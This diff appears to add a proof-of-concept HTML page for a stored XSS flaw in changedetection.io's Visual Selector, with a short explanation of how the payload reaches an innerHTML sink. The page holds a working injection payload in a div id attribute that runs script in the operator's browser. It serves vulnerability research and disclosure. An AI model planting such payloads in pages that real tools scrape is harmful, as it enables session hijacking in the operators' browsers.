@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>CPM Research Page</title></head>
+<body>
+<h1>Security Research Reference Page</h1>
+<p>This page is used to demonstrate the changedetection.io CPM vulnerability (F1).</p>
+<div id='"><img src=x onerror=alert(document.domain)>'>Monitor this section for changes</div>
+<p>The element above contains a malicious <code>id</code> attribute. When changedetection.io
+scrapes this page via Playwright and stores the visual selector data, the id value is written
+unsanitized into <code>elements.deflate</code>. On hover over the Visual Selector canvas,
+<code>visual-selector.js:253</code> assigns the raw XPath to <code>innerHTML</code>,
+triggering XSS in the operator's browser at the changedetection.io origin.</p>
+</body>
+</html>
